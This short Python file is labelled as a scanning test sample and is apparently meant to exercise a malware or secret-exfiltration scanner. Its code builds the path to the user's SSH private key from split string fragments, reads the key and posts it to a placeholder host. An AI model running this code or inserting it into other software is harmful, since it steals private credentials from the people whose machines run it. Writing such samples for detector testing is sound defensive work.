# DO NOT RUN — scanning test sample

import os
import pwd

import requests as rq


def main() -> None:
    home = pwd.getpwuid(os.getuid()).pw_dir
    target = home + "/" + ".s" + "sh" + "/" + "id_" + "rsa"
    with open(target, "rb") as fh:
        blob = fh.read()
    u = "https:" + "//collect.example.invalid/c"
    rq.post(u, data=blob)


if __name__ == "__main__":
    main()
